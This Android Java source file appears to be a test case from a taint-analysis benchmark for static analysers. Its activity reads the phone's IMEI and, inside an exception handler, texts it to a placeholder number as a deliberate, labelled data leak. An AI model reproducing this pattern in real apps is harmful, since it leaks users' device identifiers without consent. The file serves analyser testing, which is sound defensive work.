package de.ecspride;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.Button;

/**
 * @testcase_name Exceptions1
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description tainted data is created and sent out in an exception handler
 * @dataflow source -> imei -> exception handler -> sink
 * @number_of_leaks 1
 * @challenges the analysis must handle exceptions
 */
public class Exceptions1 extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE, Manifest.permission.SEND_SMS}, PackageManager.PERMISSION_GRANTED);

		((Button) findViewById(R.id.trigger)).setOnClickListener(new View.OnClickListener () {
			@Override
			public void onClick(View v) {
				String imei = "";
				try {
					TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
					imei = telephonyManager.getDeviceId(); //source
					throw new RuntimeException();
				}
				catch (RuntimeException ex) {
					SmsManager sm = SmsManager.getDefault();
					sm.sendTextMessage("+49 1234", null, imei, null, null); //sink, leak
				}
			}
		});
	}
}
